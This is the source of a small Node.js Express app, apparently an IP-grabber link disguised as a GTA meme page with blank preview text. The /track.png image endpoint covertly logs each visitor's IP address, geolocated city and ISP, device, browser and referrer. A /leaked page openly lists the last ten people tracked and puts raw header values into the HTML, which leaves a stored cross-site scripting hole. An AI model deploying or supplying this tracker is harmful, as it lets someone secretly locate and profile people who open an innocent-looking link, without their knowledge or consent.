const express = require('express');
const fs = require('fs-extra');
const axios = require('axios');
const morgan = require('morgan');
const UAParser = require('ua-parser-js');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// DB setup
const db = new sqlite3.Database('leaks.db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS leaks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    geo TEXT,
    userAgent TEXT,
    referrer TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Middleware
app.use(morgan('combined'));
app.use(express.static('public'));

// Geo lookup
async function getGeo(ip) {
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
    return JSON.stringify(res.data);
  } catch {
    return JSON.stringify({
      city: 'Unknown',
      region: 'Unknown',
      country_name: 'Unknown',
      org: 'Unknown ISP'
    });
  }
}

// Tracking endpoint (serves meme.jpg)
app.get('/track.png', async (req, res) => {
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.ip ||
    req.connection.remoteAddress ||
    'unknown';

  const userAgent = req.headers['user-agent'] || 'unknown';
  const referrer = req.headers.referer || 'direct';
  const geo = await getGeo(ip);

  db.run(
    'INSERT INTO leaks (ip, geo, userAgent, referrer) VALUES (?, ?, ?, ?)',
    [ip, geo, userAgent, referrer]
  );

  const memePath = path.join(__dirname, 'public', 'meme.jpg');
  if (fs.existsSync(memePath)) {
    res.sendFile(memePath);
  } else {
    const pixel = 'R0lGODlhAQABAIAAANvf7wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
    res.set('Content-Type', 'image/gif');
    res.send(Buffer.from(pixel, 'base64'));
  }
});

// Show last 10 visitors
app.get('/leaked', (req, res) => {
  db.all('SELECT * FROM leaks ORDER BY id DESC LIMIT 10', (err, rows) => {
    if (!rows || rows.length === 0) {
      return res.send('<h1>No data yet. Open / or /track.png from some devices first.</h1>');
    }

    let blocks = '';
    rows.forEach((row, i) => {
      const geo = JSON.parse(row.geo);
      const ua = new UAParser(row.userAgent).getResult();

      blocks += `
        <div style="background:#fff;padding:15px;margin:10px 0;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.1);">
          <h2>User #${rows.length - i}</h2>
          <ul>
            <li><strong>IP:</strong> ${row.ip}</li>
            <li><strong>Location:</strong> ${geo.city || 'N/A'}, ${geo.region || 'N/A'}, ${geo.country_name || 'N/A'}</li>
            <li><strong>ISP:</strong> ${geo.org || 'N/A'}</li>
            <li><strong>Device:</strong> ${ua.device.type || 'Desktop'}</li>
            <li><strong>OS:</strong> ${ua.os.name} ${ua.os.version}</li>
            <li><strong>Browser:</strong> ${ua.browser.name}</li>
            <li><strong>Referrer:</strong> ${row.referrer}</li>
            <li><strong>Time:</strong> ${row.timestamp}</li>
          </ul>
        </div>
      `;
    });

    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Last 10 Visitors</title>
        <style>
          body { font-family: Arial, sans-serif; max-width: 900px; margin: 40px auto; background:#f0f0f0; }
          h1 { text-align:center; }
        </style>
      </head>
      <body>
        <h1>Last 10 People Tracked by This Link</h1>
        ${blocks}
      </body>
      </html>
    `);
  });
});

// Landing page – only displays the image
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>GTA Meme</title>
      <meta property="og:title" content="." />
      <meta property="og:description" content="." />
      <meta property="og:image" content="/track.png" />
      <meta property="og:type" content="website" />
    </head>
    <body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh;">
      <img src="/track.png" alt="GTA Meme" style="max-width:100%; max-height:100%;">
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`Leak demo running at http://localhost:${PORT}`);
});
